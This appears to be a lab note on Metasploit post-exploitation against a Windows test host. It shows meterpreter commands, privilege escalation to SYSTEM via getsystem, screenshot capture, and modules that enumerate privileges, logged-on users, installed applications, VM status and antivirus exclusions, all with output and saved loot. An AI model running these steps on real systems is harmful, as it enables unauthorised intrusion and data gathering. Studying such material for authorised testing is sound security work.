# Windows Post Exploitation Modules

Utilize these post exploitation modules **to enumerate information about the Windows system** we currently have access to:\
\- Enumerate user privileges\
\- Enumerate logged on users\
\- VM check\
\- Enumerate installed programs\
\- Enumerate compters connected to domain\
\- Enumerate installed patches\
\- Enumerate shares

```bash
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a backgro
                              und thread

# FInd screenshots
meterpreter > screenshot
Screenshot saved to: /root/XbLGqGiB.jpeg

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed  29.66 GiB     8.49 GiB


Total mounts/drives: 1
```

Post Exploitation Modules
```bash
msf6 post(windows/manage/migrate) > search win_privs
msf6 post(windows/manage/migrate) > use post/windows/gather/win_privs
msf6 post(windows/gather/win_privs) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/win_privs) > run

Current User
============

 Is Admin  Is System  Is In Local  UAC Enabled  Foreground   UID
                       Admin Grou               ID
                      p
 --------  ---------  -----------  -----------  -----------  ---
 True      True       True         False        1            NT AUTHORIT
                                                             Y\SYSTEM

Windows Privileges
==================

 Name
 ----
 SeBackupPrivilege
 SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege
 SeCreatePagefilePrivilege
 SeCreateSymbolicLinkPrivilege
 SeDebugPrivilege
 SeImpersonatePrivilege
 SeIncreaseBasePriorityPrivilege
 SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 SeLoadDriverPrivilege
 SeManageVolumePrivilege
 SeProfileSingleProcessPrivilege
 SeRemoteShutdownPrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
 SeSystemEnvironmentPrivilege
 SeSystemProfilePrivilege
 SeSystemtimePrivilege
 SeTakeOwnershipPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege

msf6 post(windows/gather/win_privs) > search enum_logged_on
msf6 post(windows/gather/win_privs) > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1

msf6 post(windows/gather/enum_logged_on_users) > run

[*] Running module against WIN-OMCNBKR66MN (10.0.22.233)

Current Logged Users
====================

 SID                                       User
 ---                                       ----
 S-1-5-21-2563855374-3215282501-149039005  WIN-OMCNBKR66MN\Administrator
 2-500


[+] Results saved in: /root/.msf4/loot/20250724124630_default_10.0.22.233_host.users.activ_000622.txt

Recently Logged Users
=====================

 SID                                 Profile Path
 ---                                 ------------
 S-1-5-18                            C:\Windows\system32\config\systempr
                                     ofile
 S-1-5-19                            C:\Windows\ServiceProfiles\LocalSer
                                     vice
 S-1-5-20                            C:\Windows\ServiceProfiles\NetworkS
                                     ervice
 S-1-5-21-2563855374-3215282501-149  C:\Users\Administrator
 0390052-500


[+] Results saved in: /root/.msf4/loot/20250724124631_default_10.0.22.233_host.users.recen_549668.txt
[*] Post module execution completed

msf6 post(windows/gather/enum_logged_on_users) > search checkvm
msf6 post(windows/gather/enum_logged_on_users) > use post/windows/gather/checkvm
msf6 post(windows/gather/checkvm) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/checkvm) > run

[*] Checking if the target is a Virtual Machine ...
[+] This is a Xen Virtual Machine
[*] Post module execution completed


msf6 post(windows/gather/checkvm) > search enum_application
msf6 post(windows/gather/checkvm) > use post/windows/gather/enum_applications
msf6 post(windows/gather/enum_applications) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_applications) > run

[*] Enumerating applications installed on WIN-OMCNBKR66MN

Installed Applications
======================

 Name                                Version
 ----                                -------
 AWS Tools for Windows               3.15.1084
 AWS Tools for Windows               3.15.1084
 Amazon SSM Agent                    2.3.842.0
 Amazon SSM Agent                    2.3.842.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1
 Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1


[+] Results stored in: /root/.msf4/loot/20250724125014_default_10.0.22.233_host.application_582800.txt
[*] Post module execution completed


msf6 post(windows/gather/enum_applications) > loot

Loot
====

host         service  type               name              content     info                    path
----         -------  ----               ----              -------     ----                    ----
10.0.22.233           host.users.active  active_users.txt  text/plain  Active Users            /root/.msf4/loot/20250724124630_default_10.0.22.233_host.users.activ_000622.txt
10.0.22.233           host.users.recent  recent_users.txt  text/plain  Recent Users            /root/.msf4/loot/20250724124631_default_10.0.22.233_host.users.recen_549668.txt
10.0.22.233           host.applications  applications.txt  text/plain  Installed Applications  /root/.msf4/loot/20250724125014_default_10.0.22.233_host.application_582800.txt

msf6 post(windows/gather/enum_applications) > search type:post platform:windows enum_av
msf6 post(windows/gather/enum_applications) > use post/windows/gather/enum_av_excluded
msf6 post(windows/gather/enum_av_excluded) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_av_excluded) > run

[*] Enumerating Excluded Paths for AV on WIN-OMCNBKR66MN
[-] No supported AV identified
[*] Post module execution completed
```
